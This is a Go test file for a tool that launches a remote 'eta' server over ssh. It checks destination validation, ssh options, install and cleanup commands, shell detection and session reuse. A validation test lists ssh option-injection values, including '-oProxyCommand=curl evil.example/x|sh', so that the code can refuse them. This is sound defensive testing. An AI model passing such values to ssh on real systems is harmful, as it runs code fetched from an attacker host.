package remotepc

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestValidateDestinationRefusesAnOptionLikeValue(t *testing.T) {
	for _, bad := range []string{
		"-oProxyCommand=touch /tmp/x",
		"-oProxyCommand=curl evil.example/x|sh",
		"--version",
		"-",
		"",
		"   ",
	} {
		if err := validateDestination(bad); err == nil {
			t.Errorf("validateDestination(%q) allowed a value ssh would read as an option", bad)
		}
	}
	for _, good := range []string{"minerva", "pi@minerva", "192.168.1.5", "my-host-with-dashes", "homelab-nas"} {
		if err := validateDestination(good); err != nil {
			t.Errorf("validateDestination(%q) refused a normal destination: %v", good, err)
		}
	}
}

// TestSSHArgsShape locks in every option, each load-bearing (see
// sshArgs). Missing ExitOnForwardFailure in particular means a failed
// forward leaves ssh running and the health check succeeds against
// whatever else owns that port.
func TestSSHArgsShape(t *testing.T) {
	args, err := sshArgs("minerva", "127.0.0.1:1234:127.0.0.1:5678")
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(args, " ")
	for _, want := range []string{
		"BatchMode=yes",
		"ConnectTimeout=10",
		"ServerAliveInterval=15",
		"-T",
		"ExitOnForwardFailure=yes",
		"-L 127.0.0.1:1234:127.0.0.1:5678",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("expected %q in ssh args, got: %v", want, args)
		}
	}
	if args[len(args)-1] != "minerva" || args[len(args)-2] != "--" {
		t.Fatalf(`expected args to end with ["--", "minerva"], got: %v`, args)
	}
}

func TestSSHArgsOmitsForwardOptionsWhenThereIsNoForward(t *testing.T) {
	args, err := sshArgs("minerva", "")
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(args, " ")
	if strings.Contains(joined, "-L") || strings.Contains(joined, "ExitOnForwardFailure") {
		t.Fatalf("a detection call sets up no forward, so it should not ask ssh to exit on forward failure: %v", args)
	}
}

// TestRemoteCommandContainsEverythingUnderDotEta guards the promise that
// cleanup is one directory: if GOPATH, the build cache or the binary
// escaped ~/.eta, removing it would leave gigabytes of cache behind
// somewhere the user never agreed to.
func TestRemoteCommandContainsEverythingUnderDotEta(t *testing.T) {
	posix := remoteCommand(shellPOSIX, "github.com/hypernewbie/eta", "v1.2.3", 9999)
	for _, want := range []string{
		`GOPATH="$HOME/.eta"`,
		`GOCACHE="$GOPATH/build-cache"`,
		`"$GOPATH/bin/eta"`,
	} {
		if !strings.Contains(posix, want) {
			t.Errorf("expected %q in the POSIX command, got:\n%s", want, posix)
		}
	}
	powershell := remoteCommand(shellPowerShell, "github.com/hypernewbie/eta", "v1.2.3", 9999)
	for _, want := range []string{
		`$env:GOPATH = Join-Path $HOME ".eta"`,
		`$env:GOCACHE = Join-Path $env:GOPATH "build-cache"`,
	} {
		if !strings.Contains(powershell, want) {
			t.Errorf("expected %q in the PowerShell command, got:\n%s", want, powershell)
		}
	}
}

// TestRemoteCommandSetsModcacherw: go marks module cache files read-only,
// so without this a recursive remove of ~/.eta fails partway through.
func TestRemoteCommandSetsModcacherw(t *testing.T) {
	for _, sh := range []shell{shellPOSIX, shellPowerShell} {
		if !strings.Contains(remoteCommand(sh, "m", "v1", 1), "-modcacherw") {
			t.Errorf("shell %v: expected -modcacherw, without which ~/.eta cannot be removed", sh)
		}
	}
}

// TestRemoteCommandBindsLoopbackAndLeashesItself: the remote must not
// listen on a routable interface, and must exit when this side goes away.
func TestRemoteCommandBindsLoopbackAndLeashesItself(t *testing.T) {
	for _, sh := range []shell{shellPOSIX, shellPowerShell} {
		command := remoteCommand(sh, "m", "v1", 4321)
		for _, want := range []string{"--ip 127.0.0.1", "--exit-on-stdin-close", "--port 4321"} {
			if !strings.Contains(command, want) {
				t.Errorf("shell %v: expected %q in:\n%s", sh, want, command)
			}
		}
	}
}

func TestRemoteCommandFailsClearlyWithoutAGoToolchain(t *testing.T) {
	for _, sh := range []shell{shellPOSIX, shellPowerShell} {
		command := remoteCommand(sh, "m", "v1", 1)
		if !strings.Contains(command, "ETA:fail:no Go toolchain found") {
			t.Errorf("shell %v: a missing Go toolchain must be reported as a clear failure, not a shell error", sh)
		}
	}
}

// TestPOSIXCommandIsValidShellSyntax checks it with a real shell parser,
// not by eye.
func TestPOSIXCommandIsValidShellSyntax(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("no sh to check against")
	}
	command := remoteCommand(shellPOSIX, "github.com/hypernewbie/eta", "v0.1.0", 7099)
	if out, err := exec.Command("sh", "-n", "-c", command).CombinedOutput(); err != nil {
		t.Fatalf("generated POSIX command is not valid sh: %v\n%s\ncommand:\n%s", err, out, command)
	}
}

func TestCleanupCommandRemovesOnlyDotEta(t *testing.T) {
	if !strings.Contains(cleanupCommand(shellPOSIX), `rm -rf "$HOME/.eta"`) {
		t.Fatalf("unexpected POSIX cleanup command: %q", cleanupCommand(shellPOSIX))
	}
	if !strings.Contains(cleanupCommand(shellPowerShell), `".eta"`) {
		t.Fatalf("unexpected PowerShell cleanup command: %q", cleanupCommand(shellPowerShell))
	}
}

// TestCleanupClearsTheModuleCacheBeforeRemoving is the regression test for
// a bug the real-sshd suite caught: -modcacherw stops new read-only cache
// dirs but can't fix one an earlier install left, so cleanup must clear
// the cache with Go's own tool first or the removal fails.
func TestCleanupClearsTheModuleCacheBeforeRemoving(t *testing.T) {
	for _, sh := range []shell{shellPOSIX, shellPowerShell} {
		command := cleanupCommand(sh)
		if !strings.Contains(command, "go clean -modcache") {
			t.Errorf("shell %v: cleanup must clear the module cache first, or the removal fails on read-only files: %q", sh, command)
		}
		cleanIndex := strings.Index(command, "go clean -modcache")
		removeIndex := strings.Index(command, ".eta\"")
		if cleanIndex > 0 && removeIndex > 0 && cleanIndex > strings.LastIndex(command, "rm -rf") && sh == shellPOSIX {
			t.Errorf("shell %v: the module cache must be cleared before the removal, not after: %q", sh, command)
		}
	}
}

func TestPOSIXCleanupCommandIsValidShellSyntax(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("no sh to check against")
	}
	if out, err := exec.Command("sh", "-n", "-c", cleanupCommand(shellPOSIX)).CombinedOutput(); err != nil {
		t.Fatalf("generated cleanup command is not valid sh: %v\n%s", err, out)
	}
}

// TestSelfModuleVersionRefusesADevelopmentBuild: a test binary has no
// published version — the development-build case — which must error
// rather than fall back to @latest and install a different eta.
func TestSelfModuleVersionRefusesADevelopmentBuild(t *testing.T) {
	_, _, err := selfModuleVersion()
	if err == nil {
		t.Skip("this binary reports a real version; the development-build path is not exercised here")
	}
	if !strings.Contains(err.Error(), "development build") && !strings.Contains(err.Error(), "no module") {
		t.Fatalf("expected a clear development-build error, got: %v", err)
	}
}

func TestFreeLocalPortReturnsUsablePorts(t *testing.T) {
	first, err := freeLocalPort()
	if err != nil {
		t.Fatal(err)
	}
	second, err := freeLocalPort()
	if err != nil {
		t.Fatal(err)
	}
	if first <= 0 || second <= 0 {
		t.Fatalf("expected usable ports, got %d and %d", first, second)
	}
}

// fakeSSH stands in for the ssh client so this package's own logic can be
// tested without a network. Proves nothing about ssh itself — see
// realsshd_test.go.
func fakeSSH(t *testing.T, body string) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("shim is a POSIX script")
	}
	path := filepath.Join(t.TempDir(), "ssh")
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"+body), 0o755); err != nil {
		t.Fatal(err)
	}
	old := sshBinary
	sshBinary = path
	t.Cleanup(func() { sshBinary = old })
}

func TestDetectShellFindsPOSIX(t *testing.T) {
	fakeSSH(t, "echo 'Linux x86_64'\nexit 0\n")
	sh, err := detectShell(context.Background(), "minerva")
	if err != nil {
		t.Fatal(err)
	}
	if sh != shellPOSIX {
		t.Fatalf("expected shellPOSIX, got %v", sh)
	}
}

// TestDetectShellFindsPowerShell: a Windows target, where uname fails and
// the PowerShell probe answers.
func TestDetectShellFindsPowerShell(t *testing.T) {
	fakeSSH(t, `case "$*" in
  *uname*) exit 127 ;;
  *PSVersionTable*) echo 7; exit 0 ;;
esac
exit 1
`)
	sh, err := detectShell(context.Background(), "winbox")
	if err != nil {
		t.Fatal(err)
	}
	if sh != shellPowerShell {
		t.Fatalf("expected shellPowerShell, got %v", sh)
	}
}

// A Windows PC still on the cmd.exe default is refused with the exact
// thing to change — a clear error instead of a third code path.
func TestDetectShellNamesTheRegistryKeyForAnUnsupportedWindowsShell(t *testing.T) {
	fakeSSH(t, "exit 1\n")
	_, err := detectShell(context.Background(), "cmdbox")
	if err == nil {
		t.Fatal("expected an error when neither shell answered")
	}
	for _, want := range []string{"DefaultShell", "PowerShell", "cmd.exe"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("expected the error to mention %q so the user knows what to change, got: %v", want, err)
		}
	}
}

func TestStartRefusesADangerousDestinationBeforeSpawningAnything(t *testing.T) {
	fakeSSH(t, "echo should-not-run; exit 0\n")
	if _, err := Start(context.Background(), Options{
		Destination: "-oProxyCommand=touch /tmp/eta-should-not-exist",
		Module:      "example.com/m",
		Version:     "v1.0.0",
	}); err == nil {
		t.Fatal("Start accepted a destination ssh would read as an option")
	}
}

// A remote failure must surface as the remote's own message, not a bare
// exit status.
func TestStartSurfacesTheRemoteReportedReason(t *testing.T) {
	fakeSSH(t, `case "$*" in
  *uname*) echo 'Linux x86_64'; exit 0 ;;
esac
echo "ETA:fail:no Go toolchain found on this PC"
exit 1
`)
	_, err := Start(context.Background(), Options{
		Destination: "minerva",
		Module:      "example.com/m",
		Version:     "v1.0.0",
	})
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.Contains(err.Error(), "no Go toolchain found") {
		t.Fatalf("expected the remote's own reason, got: %v", err)
	}
}

// The health poll must give up when ssh dies, not wait out its own
// ten-minute timeout. A test that takes ten minutes to fail is the
// symptom.
func TestStartFailsFastWhenTheConnectionEndsEarly(t *testing.T) {
	fakeSSH(t, `case "$*" in
  *uname*) echo 'Linux x86_64'; exit 0 ;;
esac
echo "ETA:installing"
echo "some build output" 1>&2
exit 3
`)
	_, err := Start(context.Background(), Options{
		Destination: "minerva",
		Module:      "example.com/m",
		Version:     "v1.0.0",
	})
	if err == nil {
		t.Fatal("expected an error when the connection ended before eta answered")
	}
	if strings.Contains(err.Error(), "within 10m") {
		t.Fatalf("Start waited for its full timeout instead of noticing the process had died: %v", err)
	}
}

// Connect idempotency: a second double-click must reuse the live session.
// A second remote eta would fail to bind, for no reason the user could
// act on.
func TestManagerReusesALiveSession(t *testing.T) {
	manager := NewManager()
	fake := &Session{destination: "minerva", url: "http://127.0.0.1:1", phase: PhaseReady, exited: make(chan struct{})}
	manager.sessions["minerva"] = fake

	got, err := manager.Connect(context.Background(), Options{Destination: "minerva"})
	if err != nil {
		t.Fatal(err)
	}
	if got != fake {
		t.Fatal("Connect started a new session instead of reusing the live one")
	}
}

// The other half: an ended session must not be handed out as if it worked.
func TestManagerForgetsAnEndedSession(t *testing.T) {
	manager := NewManager()
	ended := &Session{destination: "minerva", phase: PhaseFailed, exited: make(chan struct{})}
	close(ended.exited)
	manager.sessions["minerva"] = ended

	if _, ok := manager.Get("minerva"); ok {
		t.Fatal("Get returned a session that had already ended")
	}
	if _, ok := manager.sessions["minerva"]; ok {
		t.Fatal("the ended session was left in the map")
	}
}
